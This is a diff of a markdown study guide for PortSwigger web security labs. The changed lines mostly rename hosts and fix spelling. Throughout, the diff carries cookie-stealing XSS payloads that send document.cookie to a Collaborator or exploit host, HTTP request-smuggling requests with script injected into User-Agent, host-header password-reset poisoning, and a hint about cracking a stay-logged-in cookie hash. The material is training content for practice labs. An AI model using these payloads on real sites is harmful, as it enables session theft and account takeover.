@@ -553,14 +553,14 @@ GET /?utm_content='/><script>document.location="https://Collaborator.com?c="+doc
 
 ```html
 GET / HTTP/1.1
-Host: TARGET.web-security-academy.net
-Host: exploit-target.exploit-server.net
+Host: TARGET.net
+Host: exploit.net
 ```
 
->Place the JavaScript code to perform a cookie stealer on exploit server.  
+>On the exploit server set a file as same path target calls to ```/resources/js/tracking.js```, this will contain the payload. Place the JavaScript payload code below to perform a cookie stealer.  
 
 ```
-document.location='https://Collaborator.com/?cookies='+document.cookie;
+document.location='https://Collaborator.com/?CacheCookies='+document.cookie;
 ```  
 
 ![Ambiguous Hosts](images/ambiguous-hosts.png)  
@@ -585,7 +585,7 @@ X-Forwarded-Server: EXPLOIT.net
   
 ![Exploit Server Logs capture the forgot password reset token](images/HOST-Header-forgot-password-reset.PNG)  
 
-[PortSwigger Lab: Password reset poisoning via middleware](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware)  
+[PortSwigger Lab: Password reset poisoning via middle-ware](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware)  
 
 ### HOST Connection State  
 
@@ -709,7 +709,7 @@ a"/><script>document.location='http://Collaborator.com/?cookiestealer='+document
 
 ```html
 POST / HTTP/1.1
-Host: TARGET.websecurity.net
+Host: TARGET.net
 Content-Length: 237
 Content-Type: application/x-www-form-urlencoded
 Transfer-Encoding: chunked
@@ -728,7 +728,7 @@ x=1
 
 >Check the PortSwigger Collaborator Request received from victim browsing target.  
   
-![Collaborator capture xss Request from victim browsing target](images/collaborator-xss-Request-received.png)  
+![Collaborator capture XSS Request from victim browsing target](images/collaborator-xss-Request-received.png)  
 
 [PortSwigger Lab: Exploiting HTTP request smuggling to deliver reflected XSS](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss)  
 
@@ -763,7 +763,7 @@ Transfer-encoding: cow
 
 ```html
 POST / HTTP/1.1
-Host: TARGET.websecurity-academy.net
+Host: TARGET.net
 Content-Type: application/x-www-form-urlencoded
 Content-length: 4
 Transfer-Encoding: chunked
@@ -771,7 +771,7 @@ Transfer-encoding: identity
 
 e6
 GET /post?postId=4 HTTP/1.1
-User-Agent: a"/><script>document.location='http://COLLAB.com/?c='+document.cookie;</script>
+User-Agent: a"/><script>document.location='http://COLLABORATOR.com/?c='+document.cookie;</script>
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 15
 
@@ -795,7 +795,7 @@ x=1
 
 >***Identify*** possible vulnerability when Target reflect previous and recent search history based on cookie, by removing cookie it is noticed that your search history is reset, confirming that it's tied to your session cookie.  
 
-![recent-searchs](images/recent-searchs.png)  
+![recent searches](images/recent-searchs.png)  
 
 >Expand the Inspector's Request Attributes section and change the protocol to HTTP/2, then append arbitrary header ```foo``` with value ```bar```, follow with the sequence ```\r\n```, then followed by the ```Transfer-Encoding: chunked```, by pressing **shift+ENTER**.  
 
@@ -895,7 +895,7 @@ document.location='https://EXPLOIT.net/StealCookie='+document.cookie
   
 >Base64 decode the ```stay-logged-in``` cookie value and use an online **MD5** hash crack station database.  
 
-![stay-logged-in offline](images/stay-logged-in-offline.png)  
+![stay-logged-in Offline](images/stay-logged-in-offline.png)  
 
 [PortSwigger Lab: Offline password cracking](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)  
 
